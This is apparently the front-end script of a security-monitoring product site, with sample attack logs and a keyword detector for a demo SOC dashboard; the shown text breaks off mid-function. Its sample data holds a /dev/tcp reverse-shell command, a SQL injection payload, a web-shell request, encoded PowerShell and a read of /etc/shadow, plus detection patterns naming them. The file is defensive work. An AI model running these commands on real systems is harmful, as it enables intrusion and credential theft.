/* ==========================================================================
   Sentinel-X Official Website & Full Interactive Console — (public/app.js)
   All 6 Navigation Tabs & Sub-Consoles 100% Interactive:
   1. Main Tab Switcher (Overview, SOC Dashboard, Simulator, Architecture, API Settings, Anti-REA, Releases)
   2. Hero Quick-Start Terminal & SHA-256 Clipboard Copy
   3. Live SOC Dashboard, Log Ingestion, MITRE Alerts, Incident Management & Report Exporter
   4. Threat Detection Simulator, Sigma YAML Rule Studio & Official MITRE ATT&CK Catalog
   5. Customer External API Connectors (/settings) with Secret Masking & Live Probe
   6. Anti-REA Security Audit Scanner & Ed25519 Manifest Signing / Tamper Simulator
   7. Release Download Center, WebCrypto SHA-256 File Verifier & Live Patch Diff Viewer
   ========================================================================== */

(function () {
  "use strict";

  const STORAGE_KEYS = {
    SOC_STATE: "sentinel_x_soc_state_v2",
    CONNECTORS: "sentinel_x_connectors_v2"
  };

  let liveVersionInfo = {
    version: "0.1.3",
    exe_sha256: "73cc5e692a45f688e5d7282f54e624dcd39dea7ba6a25665f34d2285fe11fd89",
    patch_file: "patches/v0.1.3.patch",
    patch_sha256: "57e1e57515db8dce349e20312b2a0c237136c3ec9abd8b3de425e3943f4528a5"
  };

  /* ------------------------------------------------------------------------
     Utility Helpers
     ------------------------------------------------------------------------ */
  function escapeHtml(value) {
    return String(value == null ? "" : value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function maskSecret(rawSecret) {
    const clean = String(rawSecret || "").trim();
    if (!clean) return "";
    if (clean.length <= 4) return "••••••••";
    return "••••••••" + clean.slice(-4);
  }

  function downloadTextFile(filename, content, mimeType) {
    const blob = new Blob([content], { type: mimeType || "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(function () {
      URL.revokeObjectURL(url);
    }, 1000);
  }

  function copyTextToClipboard(text, btnElement, copiedLabel) {
    if (!navigator.clipboard || !navigator.clipboard.writeText) return;
    navigator.clipboard.writeText(String(text || "")).then(function () {
      if (btnElement) {
        const original = btnElement.textContent;
        btnElement.textContent = copiedLabel || "คัดลอกแล้ว (Copied)";
        setTimeout(function () {
          btnElement.textContent = original;
        }, 1600);
      }
    });
  }

  /* ------------------------------------------------------------------------
     1. Main Navigation Tab Switcher
     ------------------------------------------------------------------------ */
  const TAB_TITLES = {
    overview: "แท็บ: ภาพรวมแพลตฟอร์ม & Quick-Start Terminal",
    dashboard: "แท็บ: ศูนย์ปฏิบัติการ SOC Dashboard, การนำเข้า Log & บริหารจัดการเคส Incident",
    simulator: "แท็บ: ทดลองตรวจจับภัยคุกคาม (Live Simulator), Sigma YAML Studio & MITRE ATT&CK",
    capabilities: "แท็บ: สถาปัตยกรรม 6 โมดูลหลัก (Modular SOC & Anti-REA Architecture)",
    integrations: "แท็บ: ตั้งค่าการเชื่อมต่อ API บริการภายนอก (/settings — Customer API Connectors)",
    "anti-rea": "แท็บ: Anti-REA Release Protection Studio (สแกนความปลอดภัย & ลงนาม Ed25519)",
    releases: "แท็บ: ดาวน์โหลด .EXE, ตรวจสอบค่า SHA-256 & ดูไฟล์ Patch ล่าสุด"
  };

  function activateMainTab(targetKey, shouldScroll) {
    const validTargets = ["overview", "dashboard", "simulator", "capabilities", "integrations", "anti-rea", "releases"];
    const key = validTargets.indexOf(targetKey) !== -1 ? targetKey : "overview";

    const navBtns = document.querySelectorAll(".nav-links [data-tab-target], .footer-links [data-tab-target]");
    navBtns.forEach(function (btn) {
      if (btn.getAttribute("data-tab-target") === key) {
        btn.classList.add("active");
      } else {
        btn.classList.remove("active");
      }
    });

    const panels = document.querySelectorAll(".tab-panel");
    document.body.classList.remove("show-all-tabs");
    panels.forEach(function (p) {
      if (p.getAttribute("data-tab-panel") === key) {
        p.classList.add("active");
      } else {
        p.classList.remove("active");
      }
    });

    const indicator = document.getElementById("active-tab-indicator");
    if (indicator && TAB_TITLES[key]) {
      indicator.innerHTML = "โหมดแสดงผลปัจจุบัน: <strong>" + escapeHtml(TAB_TITLES[key]) + "</strong>";
    }

    if (window.history && window.history.replaceState) {
      const hashUrl = key === "overview" ? window.location.pathname : "#" + key;
      window.history.replaceState(null, "", hashUrl);
    }

    if (shouldScroll) {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  }

  function initMainTabSwitcher() {
    document.querySelectorAll("[data-tab-target]").forEach(function (trigger) {
      trigger.addEventListener("click", function (ev) {
        ev.preventDefault();
        const target = trigger.getAttribute("data-tab-target");
        activateMainTab(target, true);
      });
    });

    const pathname = (window.location.pathname || "").toLowerCase();
    const hash = (window.location.hash || "").replace(/^#/, "").toLowerCase();

    if (pathname.indexOf("/settings") === 0 || hash === "integrations" || hash === "settings") {
      activateMainTab("integrations", false);
    } else if (pathname.indexOf("/dashboard") === 0 || hash === "dashboard") {
      activateMainTab("dashboard", false);
    } else if (pathname.indexOf("/simulator") === 0 || hash === "simulator") {
      activateMainTab("simulator", false);
    } else if (pathname.indexOf("/anti-rea") === 0 || hash === "anti-rea") {
      activateMainTab("anti-rea", false);
    } else if (pathname.indexOf("/releases") === 0 || hash === "releases") {
      activateMainTab("releases", false);
    } else if (hash === "capabilities") {
      activateMainTab("capabilities", false);
    } else {
      activateMainTab("overview", false);
    }
  }

  /* ------------------------------------------------------------------------
     2. Hero Quick-Start Terminal & SHA-256 Copy
     ------------------------------------------------------------------------ */
  const TERMINAL_SNIPPETS = {
    windows_exe: [
      "# 1. ดึงโค้ดหรืออัปเดต Patch พร้อมรับไฟล์ dist\\sentinel-x.exe ที่คอมไพล์เสร็จแล้ว",
      "git clone https://github.com/lastmy2557-png/Sentinel-X.git",
      "cd Sentinel-X",
      "scripts\\apply_patch_windows.bat",
      "",
      "# 2. เปิดใช้งาน SOC Dashboard (/) และหน้าตั้งค่า API บริการภายนอก (/settings)",
      "dist\\sentinel-x.exe serve --host 127.0.0.1 --port 8080"
    ].join("\n"),
    python_cli: [
      "# 1. รันชุดทดสอบทั้งหมดและตรวจสอบความปลอดภัย Anti-REA",
      "python3 -m unittest discover -s tests -p \"test_*.py\" -v",
      "python3 -m sentinel_x.security.release_protection.cli audit --root . --format markdown",
      "",
      "# 2. Ingest ข้อมูล Log และเปิดใช้งาน Local-first Security Dashboard",
      "python3 -m sentinel_x.cli ingest --file data/samples/sample_security.log --sample",
      "python3 -m sentinel_x.cli serve --host 127.0.0.1 --port 8080"
    ].join("\n"),
    docker_ghcr: [
      "# ดึง Container Image แบบ Non-root จาก GitHub Packages (ghcr.io)",
      "docker pull ghcr.io/lastmy2557-png/sentinel-x:latest",
      "",
      "# รัน Sentinel-X SOC Dashboard & API Server บนพอร์ต 8080",
      "docker run --rm -p 127.0.0.1:8080:8080 ghcr.io/lastmy2557-png/sentinel-x:latest"
    ].join("\n"),
    anti_rea: [
      "# สร้างกุญแจ Ed25519 ไว้นอก Repository และลงนาม Signed Release Manifest",
      "python3 -m sentinel_x.security.release_protection.cli keygen \\",
      "  --private-key /tmp/release.key --public-key /tmp/release_public.pem",
      "",
      "python3 -m sentinel_x.security.release_protection.cli sign \\",
      "  --root . --private-key /tmp/release.key --output /tmp/release_manifest.json",
      "",
      "python3 -m sentinel_x.security.release_protection.cli verify \\",
      "  --root . --manifest /tmp/release_manifest.json --public-key /tmp/release_public.pem"
    ].join("\n")
  };

  const TERMINAL_CAPTIONS = {
    windows_exe: "On Windows x64 (pre-compiled standalone PE32+ executable included in dist\\sentinel-x.exe):",
    python_cli: "On Linux or macOS (Python 3.11+ with zero external runtime dependencies):",
    docker_ghcr: "In Docker / Container runtime (official non-root image on GitHub Packages):",
    anti_rea: "Cryptographic Release Protection (external RFC 8032 Ed25519 keygen, sign & verify):"
  };

  function initTerminalTabs() {
    const tabs = document.querySelectorAll(".term-tab");
    const codeEl = document.getElementById("hero-terminal-code");
    const captionEl = document.getElementById("hero-cmd-caption");
    const copyBtn = document.getElementById("btn-copy-terminal");
    const copyHashBtn = document.getElementById("btn-copy-exe-hash");
    const copyHubBtn = document.getElementById("btn-copy-hub-url");

    tabs.forEach(function (tab) {
      tab.addEventListener("click", function () {
        tabs.forEach(function (t) {
          t.classList.remove("active");
        });
        tab.classList.add("active");
        const key = tab.getAttribute("data-tab");
        if (codeEl && TERMINAL_SNIPPETS[key]) {
          codeEl.textContent = TERMINAL_SNIPPETS[key];
        }
        if (captionEl && TERMINAL_CAPTIONS[key]) {
          captionEl.textContent = TERMINAL_CAPTIONS[key];
        }
      });
    });

    if (copyBtn && codeEl) {
      copyBtn.addEventListener("click", function () {
        copyTextToClipboard(codeEl.textContent || "", copyBtn, "Copied ✓");
      });
    }

    if (copyHashBtn) {
      copyHashBtn.addEventListener("click", function () {
        const hashNode = document.getElementById("live-exe-sha256");
        copyTextToClipboard(hashNode ? hashNode.textContent.trim() : "", copyHashBtn, "copied ✓");
      });
    }

    if (copyHubBtn) {
      copyHubBtn.addEventListener("click", function () {
        const hubNode = document.getElementById("connector-hub-url");
        copyTextToClipboard(hubNode ? hubNode.textContent.trim() : "", copyHubBtn, "copied ✓");
      });
    }
  }

  /* ------------------------------------------------------------------------
     3. Official MITRE ATT&CK Catalog & Log Evaluation Engine
     ------------------------------------------------------------------------ */
  const OFFICIAL_MITRE_CATALOG = [
    {
      id: "T1110.001",
      name: "Password Guessing (SSH Brute Force)",
      tactic: "Credential Access",
      rule_id: "SX-RULE-001",
      scenario_key: "ssh_bruteforce"
    },
    {
      id: "T1548.003",
      name: "Sudo and Sudo Caching (Privilege Escalation)",
      tactic: "Privilege Escalation",
      rule_id: "SX-RULE-002",
      scenario_key: "sudo_escalation"
    },
    {
      id: "T1505.003",
      name: "Server Software Component: Web Shell",
      tactic: "Persistence",
      rule_id: "SX-SIGMA-001",
      scenario_key: "webshell_upload"
    },
    {
      id: "T1059.004",
      name: "Command and Scripting Interpreter: Unix Shell",
      tactic: "Execution",
      rule_id: "SX-RULE-004",
      scenario_key: "reverse_shell"
    },
    {
      id: "T1190",
      name: "Exploit Public-Facing Application (SQL Injection)",
      tactic: "Initial Access",
      rule_id: "SX-RULE-005",
      scenario_key: "sqli_exploit"
    },
    {
      id: "T1059.001",
      name: "Command and Scripting Interpreter: PowerShell",
      tactic: "Execution",
      rule_id: "SX-RULE-006",
      scenario_key: "powershell_c2"
    },
    {
      id: "T1003.008",
      name: "OS Credential Dumping: /etc/passwd and /etc/shadow",
      tactic: "Credential Access",
      rule_id: "SX-SIGMA-002",
      scenario_key: "shadow_dump"
    }
  ];

  const SCENARIOS = {
    ssh_bruteforce: {
      raw: "2026-11-07T10:15:04Z sshd[2140]: Failed password for invalid user admin from 203.0.113.55 port 51234 ssh2",
      normalized: {
        timestamp: "2026-11-07T10:15:04+00:00",
        source_type: "linux_auth",
        category: "AUTHENTICATION",
        severity: "HIGH",
        source_ip: "203.0.113.55",
        user: "admin",
        action: "ssh_login_failed",
        outcome: "FAILURE",
        message: "Failed password for invalid user admin from 203.0.113.55 port 51234 ssh2"
      },
      alert: {
        rule_id: "SX-RULE-001",
        title: "SSH Brute Force / Repeated Authentication Failure",
        severity: "HIGH",
        mitre_technique_id: "T1110.001",
        mitre_technique_name: "Password Guessing",
        mitre_tactic: "Credential Access",
        explanation: "Detected SSH authentication failure from source_ip=203.0.113.55 targeting user=admin."
      }
    },
    sudo_escalation: {
      raw: "2026-11-07T10:18:22Z sudo: www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
      normalized: {
        timestamp: "2026-11-07T10:18:22+00:00",
        source_type: "linux_auth",
        category: "PRIVILEGE_ESCALATION",
        severity: "HIGH",
        source_ip: "127.0.0.1",
        user: "www-data",
        action: "sudo_unauthorized",
        outcome: "FAILURE",
        message: "www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"
      },
      alert: {
        rule_id: "SX-RULE-002",
        title: "Unauthorized Sudo Privilege Escalation Attempt",
        severity: "HIGH",
        mitre_technique_id: "T1548.003",
        mitre_technique_name: "Sudo and Sudo Caching",
        mitre_tactic: "Privilege Escalation",
        explanation: "Service account 'www-data' attempted unauthorized sudo execution of '/bin/bash' as root."
      }
    },
    webshell_upload: {
      raw: "198.51.100.77 - - [07/Nov/2026:10:21:09 +0000] \"POST /uploads/cmd_shell.jsp?cmd=whoami HTTP/1.1\" 200 1420",
      normalized: {
        timestamp: "2026-11-07T10:21:09+00:00",
        source_type: "web_access",
        category: "WEB_ATTACK",
        severity: "CRITICAL",
        source_ip: "198.51.100.77",
        user: "-",
        action: "http_post_suspicious_script",
        outcome: "SUCCESS",
        message: "POST /uploads/cmd_shell.jsp?cmd=whoami HTTP/1.1 (status 200)"
      },
      alert: {
        rule_id: "SX-SIGMA-001",
        title: "Web Shell Upload or Command Execution Detected",
        severity: "CRITICAL",
        mitre_technique_id: "T1505.003",
        mitre_technique_name: "Web Shell",
        mitre_tactic: "Persistence",
        explanation: "HTTP POST request to executable script path '/uploads/cmd_shell.jsp?cmd=whoami' from 198.51.100.77 returned HTTP 200."
      }
    },
    reverse_shell: {
      raw: "{\"timestamp\":\"2026-11-07T10:25:00Z\",\"category\":\"PROCESS_EXECUTION\",\"user\":\"ubuntu\",\"source_ip\":\"10.10.14.9\",\"command\":\"bash -i >& /dev/tcp/198.51.100.99/4444 0>&1\"}",
      normalized: {
        timestamp: "2026-11-07T10:25:00+00:00",
        source_type: "json_event",
        category: "PROCESS_EXECUTION",
        severity: "CRITICAL",
        source_ip: "10.10.14.9",
        user: "ubuntu",
        action: "process_spawn",
        outcome: "OBSERVED",
        message: "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1"
      },
      alert: {
        rule_id: "SX-RULE-004",
        title: "Suspicious Interactive Reverse Shell Command",
        severity: "CRITICAL",
        mitre_technique_id: "T1059.004",
        mitre_technique_name: "Unix Shell",
        mitre_tactic: "Execution",
        explanation: "Process execution contains interactive /dev/tcp reverse shell redirection to remote host 198.51.100.99:4444."
      }
    },
    sqli_exploit: {
      raw: "203.0.113.88 - - [07/Nov/2026:10:29:15 +0000] \"GET /api/users?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20accounts-- HTTP/1.1\" 200 4890",
      normalized: {
        timestamp: "2026-11-07T10:29:15+00:00",
        source_type: "web_access",
        category: "WEB_ATTACK",
        severity: "CRITICAL",
        source_ip: "203.0.113.88",
        user: "-",
        action: "http_sqli_probe",
        outcome: "SUCCESS",
        message: "GET /api/users?id=1' UNION SELECT username,password_hash FROM accounts-- HTTP/1.1"
      },
      alert: {
        rule_id: "SX-RULE-005",
        title: "SQL Injection UNION SELECT Exploitation Attempt",
        severity: "CRITICAL",
        mitre_technique_id: "T1190",
        mitre_technique_name: "Exploit Public-Facing Application",
        mitre_tactic: "Initial Access",
        explanation: "Detected SQL Injection UNION SELECT payload in HTTP query string from 203.0.113.88."
      }
    },
    powershell_c2: {
      raw: "2026-11-07T10:32:40Z WIN-SRV01 powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
      normalized: {
        timestamp: "2026-11-07T10:32:40+00:00",
        source_type: "windows_process",
        category: "PROCESS_EXECUTION",
        severity: "HIGH",
        source_ip: "10.20.1.15",
        user: "SYSTEM",
        action: "powershell_encoded",
        outcome: "OBSERVED",
        message: "powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
      },
      alert: {
        rule_id: "SX-RULE-006",
        title: "Obfuscated / Encoded PowerShell Command Execution",
        severity: "HIGH",
        mitre_technique_id: "T1059.001",
        mitre_technique_name: "PowerShell",
        mitre_tactic: "Execution",
        explanation: "PowerShell launched with hidden window and Base64 -EncodedCommand flag on host WIN-SRV01."
      }
    },
    shadow_dump: {
      raw: "2026-11-07T10:35:12Z auditd[992]: user=backup-svc cmd=\"cat /etc/shadow\" res=success ip=10.10.20.4",
      normalized: {
        timestamp: "2026-11-07T10:35:12+00:00",
        source_type: "linux_audit",
        category: "CREDENTIAL_ACCESS",
        severity: "CRITICAL",
        source_ip: "10.10.20.4",
        user: "backup-svc",
        action: "read_sensitive_file",
        outcome: "SUCCESS",
        message: "auditd[992]: user=backup-svc cmd=\"cat /etc/shadow\" res=success"
      },
      alert: {
        rule_id: "SX-SIGMA-002",
        title: "Linux /etc/shadow Credential File Access",
        severity: "CRITICAL",
        mitre_technique_id: "T1003.008",
        mitre_technique_name: "/etc/passwd and /etc/shadow",
        mitre_tactic: "Credential Access",
        explanation: "Non-root account 'backup-svc' accessed /etc/shadow credential hash file."
      }
    }
  };

  let customSigmaRules = [];

  function evaluateCustomLog(rawText) {
    const text = String(rawText || "").trim();
    const lower = text.toLowerCase();
    const ipMatch = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    const extractedIp = ipMatch ? ipMatch[0] : "127.0.0.1";
    const userMatch = text.match(/(?:user[=\s]+|for\s+)([a-zA-Z0-9._-]+)/i);
    const extractedUser = userMatch ? userMatch[1] : "unknown";
    const nowIso = new Date().toISOString();

    // Check custom registered Sigma rules first
    for (let i = 0; i < customSigmaRules.length; i++) {
      const rule = customSigmaRules[i];
      const matchedKw = rule.keywords.find(function (kw) {
        return kw && lower.indexOf(kw.toLowerCase()) !== -1;
      });
      if (matchedKw) {
        return {
          normalized: {
            timestamp: nowIso,
            source_type: "sigma_evaluated",
            category: "SIGMA_DETECTION",
            severity: rule.severity,
            source_ip: extractedIp,
            user: extractedUser,
            action: "sigma_keyword_match",
            outcome: "OBSERVED",
            message: text
          },
          alert: {
            rule_id: rule.rule_id,
            title: rule.title,
            severity: rule.severity,
            mitre_technique_id: rule.mitre_technique_id,
            mitre_technique_name: rule.mitre_technique_name,
            mitre_tactic: rule.mitre_tactic,
            explanation: "Matched Sigma rule '" + rule.title + "' on keyword '" + matchedKw + "'."
          }
        };
      }
    }

    if (lower.indexOf("failed password") !== -1 || lower.indexOf("authentication failure") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "linux_auth",
          category: "AUTHENTICATION",
          severity: "HIGH",
          source_ip: extractedIp,
          user: extractedUser,
          action: "auth_failure",
          outcome: "FAILURE",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-001",
          title: "Authentication Brute Force / Password Guessing Indicator",
          severity: "HIGH",
          mitre_technique_id: "T1110.001",
          mitre_technique_name: "Password Guessing",
          mitre_tactic: "Credential Access",
          explanation: "Matched authentication failure pattern from source_ip=" + extractedIp
        }
      };
    }

    if (lower.indexOf("sudo") !== -1 && (lower.indexOf("not in sudoers") !== -1 || lower.indexOf("command=") !== -1)) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "linux_auth",
          category: "PRIVILEGE_ESCALATION",
          severity: "HIGH",
          source_ip: extractedIp,
          user: extractedUser,
          action: "sudo_invocation",
          outcome: "FAILURE",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-002",
          title: "Suspicious Sudo Privilege Escalation",
          severity: "HIGH",
          mitre_technique_id: "T1548.003",
          mitre_technique_name: "Sudo and Sudo Caching",
          mitre_tactic: "Privilege Escalation",
          explanation: "Matched unauthorized sudoers or privileged command escalation pattern."
        }
      };
    }

    if (lower.indexOf(".jsp") !== -1 || lower.indexOf(".php") !== -1 || lower.indexOf("cmd=") !== -1 || lower.indexOf("webshell") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "web_access",
          category: "WEB_ATTACK",
          severity: "CRITICAL",
          source_ip: extractedIp,
          user: "-",
          action: "web_script_probe",
          outcome: "SUCCESS",
          message: text
        },
        alert: {
          rule_id: "SX-SIGMA-001",
          title: "Web Shell or Remote Command Probe Detected",
          severity: "CRITICAL",
          mitre_technique_id: "T1505.003",
          mitre_technique_name: "Web Shell",
          mitre_tactic: "Persistence",
          explanation: "Matched web shell script extension or remote command parameter in HTTP request."
        }
      };
    }

    if (lower.indexOf("union select") !== -1 || lower.indexOf("or 1=1") !== -1 || lower.indexOf("union%20select") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "web_access",
          category: "WEB_ATTACK",
          severity: "CRITICAL",
          source_ip: extractedIp,
          user: "-",
          action: "http_sqli_probe",
          outcome: "OBSERVED",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-005",
          title: "SQL Injection Exploitation Attempt",
          severity: "CRITICAL",
          mitre_technique_id: "T1190",
          mitre_technique_name: "Exploit Public-Facing Application",
          mitre_tactic: "Initial Access",
          explanation: "Detected SQL injection payload in HTTP request from " + extractedIp
        }
      };
    }

    if (lower.indexOf("-encodedcommand") !== -1 || lower.indexOf("powershell") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "windows_process",
          category: "PROCESS_EXECUTION",
          severity: "HIGH",
          source_ip: extractedIp,
          user: "SYSTEM",
          action: "powershell_encoded",
          outcome: "OBSERVED",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-006",
          title: "Encoded PowerShell Execution Detected",
          severity: "HIGH",
          mitre_technique_id: "T1059.001",
          mitre_technique_name: "PowerShell",
          mitre_tactic: "Execution",
          explanation: "Detected suspicious PowerShell execution flags."
        }
      };
    }

    if (lower.indexOf("/etc/shadow") !== -1 || lower.indexOf("/etc/passwd") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "linux_audit",
          category: "CREDENTIAL_ACCESS",
          severity: "CRITICAL",
          source_ip: extractedIp,
          user: extractedUser,
          action: "read_sensitive_file",
          outcome: "SUCCESS",
          message: text
        },
        alert: {
          rule_id: "SX-SIGMA-002",
          title: "Linux Credential File (/etc/shadow) Access",
          severity: "CRITICAL",
          mitre_technique_id: "T1003.008",
          mitre_technique_name: "/etc/passwd and /etc/shadow",
          mitre_tactic: "Credential Access",
          explanation: "Detected read access to sensitive credential file /etc/shadow."
        }
      };
    }

    if (lower.indexOf("/dev/tcp/") !== -1 || lower.indexOf("nc -e") !== -1 || lower.indexOf("bash -i") !== -1 || lower.indexOf("| bash") !== -1 || lower.indexOf("| sh") !== -1) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "process_exec",
          category: "PROCESS_EXECUTION",
          severity: "CRITICAL",
          source_ip: extractedIp,
          user: extractedUser,
          action: "reverse_shell_spawn",
          outcome: "OBSERVED",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-004",
          title: "Reverse Shell or Remote Script Pipe Execution",
          severity: "CRITICAL",
          mitre_technique_id: "T1059.004",
          mitre_technique_name: "Unix Shell",
          mitre_tactic: "Execution",
          explanation: "Matched interactive shell socket redirection or remote pipe execution pattern."
        }
      };
    }

    return {
      normalized: {
        timestamp: nowIso,
        source_type: "custom_input",
        category: "GENERAL_TELEMETRY",
        severity: "INFO",
        source_ip: extractedIp,
        user: extractedUser,
        action: "log_ingested",
        outcome: "NORMALIZED",
        message: text
      },
      alert: {
        rule_id: "NONE",
        title: "No Threat Signature Triggered (Benign / Informational Event)",
        severity: "INFO",
        mitre_technique_id: "N/A",
        mitre_technique_name: "No MITRE ATT&CK Match",
        mitre_tactic: "None",
        explanation: "Event was normalized into UTC ISO-8601 schema and stored without triggering high-risk detection rules."
      }
    };
  }

  /* ------------------------------------------------------------------------
     4. Tab 2: Interactive SOC Dashboard & Incident Response State
     ------------------------------------------------------------------------ */
  const INGEST_PRESETS = {
    mixed_attack: [
      SCENARIOS.ssh_bruteforce.raw,
      SCENARIOS.sudo_escalation.raw,
      SCENARIOS.webshell_upload.raw,
      SCENARIOS.reverse_shell.raw
    ].join("\n"),
    ssh_burst: [
      "2026-11-07T11:01:01Z sshd[3101]: Failed password for invalid user root from 198.51.100.42 port 44120 ssh2",
      "2026-11-07T11:01:03Z sshd[3102]: Failed password for invalid user admin from 198.51.100.42 port 44121 ssh2",
      "2026-11-07T11:01:05Z sshd[3103]: Failed password for invalid user deploy from 198.51.100.42 port 44122 ssh2"
    ].join("\n"),
    web_exploit: [
      SCENARIOS.webshell_upload.raw,
      SCENARIOS.sqli_exploit.raw,
      SCENARIOS.shadow_dump.raw
    ].join("\n")
  };

  function getDefaultSocState() {
    return {
      includeSamples: true,
      activeRulesCount: 7,
      events: [
        Object.assign({}, SCENARIOS.ssh_bruteforce.normalized, { is_sample: true }),
        Object.assign({}, SCENARIOS.sudo_escalation.normalized, { is_sample: true }),
        Object.assign({}, SCENARIOS.webshell_upload.normalized, { is_sample: false }),
        Object.assign({}, SCENARIOS.reverse_shell.normalized, { is_sample: false })
      ],
      alerts: [
        Object.assign({}, SCENARIOS.webshell_upload.alert, {
          alert_id: "ALT-1001",
          created_at: "2026-11-07T10:21:09+00:00",
          is_sample: false
        }),
        Object.assign({}, SCENARIOS.reverse_shell.alert, {
          alert_id: "ALT-1002",
          created_at: "2026-11-07T10:25:00+00:00",
          is_sample: false
        }),
        Object.assign({}, SCENARIOS.ssh_bruteforce.alert, {
          alert_id: "ALT-1003",
          created_at: "2026-11-07T10:15:04+00:00",
          is_sample: true
        }),
        Object.assign({}, SCENARIOS.sudo_escalation.alert, {
          alert_id: "ALT-1004",
          created_at: "2026-11-07T10:18:22+00:00",
          is_sample: true
        })
      ],
      incidents: [
        {
          incident_id: "INC-2026-001",
          status: "INVESTIGATING",
          severity: "CRITICAL",
          title: "Web Shell Upload & Interactive Reverse Shell on Production Host",
          assigned_to: "soc-lead",
          is_sample: false,
          mitre_techniques: ["T1505.003", "T1059.004"],
          timeline: [
            "2026-11-07T10:21:10Z — เปิดเคสอัตโนมัติจาก Alert ALT-1001 (Web Shell T1505.003)",
            "2026-11-07T10:25:05Z — ผูกหลักฐานเพิ่มเติมจาก Alert ALT-1002 (Reverse Shell T1059.004)",
            "2026-11-07T10:28:00Z — [soc-lead] สั่งกักกันเครื่องปลายทางผ่าน EDR Connector และตรวจสอบไฟล์ /uploads/"
          ]
        },
        {
          incident_id: "INC-2026-002",
          status: "OPEN",
          severity: "HIGH",
          title: "SSH Brute Force & Unauthorized Sudo Escalation Sequence",
          assigned_to: "soc-tier1",
          is_sample: true,
          mitre_techniques: ["T1110.001", "T1548.003"],
          timeline: [
            "2026-11-07T10:18:30Z — เปิดเคสจากชุดข้อมูลตัวอย่าง (Sample Telemetry)"
          ]
        }
      ]
    };
  }

  let socState = getDefaultSocState();

  function loadSocState() {
    try {
      const raw = localStorage.getItem(STORAGE_KEYS.SOC_STATE);
      if (raw) {
        const parsed = JSON.parse(raw);
        if (parsed && Array.isArray(parsed.events) && Array.isArray(parsed.alerts) && Array.isArray(parsed.incidents)) {
          socState = parsed;
        }
      }
    } catch (e) {
      socState = getDefaultSocState();
    }
  }

  function saveSocState() {
    try {
      localStorage.setItem(STORAGE_KEYS.SOC_STATE, JSON.stringify(socState));
    } catch (e) {
      // Ignore storage quota errors
    }
  }

  function renderSocDashboard() {
    const incSample = socState.includeSamples;
    const allEvents = socState.events || [];
    const realEventsCount = allEvents.filter(function (e) { return !e.is_sample; }).length;
    const sampleEventsCount = allEvents.filter(function (e) { return e.is_sample; }).length;

    const visibleEvents = allEvents.filter(function (e) { return incSample || !e.is_sample; });
    const visibleAlerts = (socState.alerts || []).filter(function (a) { return incSample || !a.is_sample; });
    const visibleIncidents = (socState.incidents || []).filter(function (i) { return incSample || !i.is_sample; });

    const setTxt = function (id, val) {
      const el = document.getElementById(id);
      if (el) el.textContent = String(val);
    };
    setTxt("stat-total-events", visibleEvents.length);
    setTxt("stat-real-events", realEventsCount);
    setTxt("stat-sample-events", incSample ? sampleEventsCount : 0);
    setTxt("stat-total-alerts", visibleAlerts.length);
    setTxt("stat-total-incidents", visibleIncidents.length);
    setTxt("stat-active-rules", (socState.activeRulesCount || 7) + customSigmaRules.length);

    const toggleBtn = document.getElementById("btn-toggle-sample-filter");
    if (toggleBtn) {
      toggleBtn.textContent = incSample
        ? "โหมดข้อมูล: แสดงทั้งหมด (REAL + SAMPLE)"
        : "โหมดข้อมูล: เฉพาะข้อมูลจริง (REAL ONLY)";
    }

    const noticeEl = document.getElementById("soc-telemetry-notice");
    if (noticeEl) {
      const msg = incSample
        ? "MIXED_OR_SAMPLE_TELEMETRY: แสดงเหตุการณ์จริง (REAL) " + realEventsCount + " รายการ และข้อมูลตัวอย่าง (SAMPLE) " + sampleEventsCount + " รายการ"
        : "REAL_TELEMETRY_ONLY: แสดงเฉพาะเหตุการณ์จริง (REAL) " + realEventsCount + " รายการ (ซ่อนข้อมูลตัวอย่าง)";
      noticeEl.innerHTML = "<span><strong>Telemetry Status:</strong> " + escapeHtml(msg) + "</span><span class=\"severity-pill sev-PASSED\">ENGINE ONLINE</span>";
    }

    // Filter alerts by severity & search
    const sevFilterEl = document.getElementById("soc-alert-sev-filter");
    const searchEl = document.getElementById("soc-alert-search");
    const sevFilter = sevFilterEl ? sevFilterEl.value : "ALL";
    const searchQuery = searchEl ? searchEl.value.trim().toLowerCase() : "";

    const filteredAlerts = visibleAlerts.filter(function (a) {
      if (sevFilter !== "ALL" && a.severity !== sevFilter) return false;
      if (searchQuery) {
        const hay = (a.title + " " + a.mitre_technique_id + " " + a.mitre_tactic + " " + a.explanation + " " + a.rule_id).toLowerCase();
        if (hay.indexOf(searchQuery) === -1) return false;
      }
      return true;
    });

    const alertsTbody = document.getElementById("soc-alerts-tbody");
    if (alertsTbody) {
      if (filteredAlerts.length === 0) {
        alertsTbody.innerHTML = "<tr><td colspan=\"7\"><em>ไม่พบรายการแจ้งเตือนที่ตรงกับเงื่อนไข</em></td></tr>";
      } else {
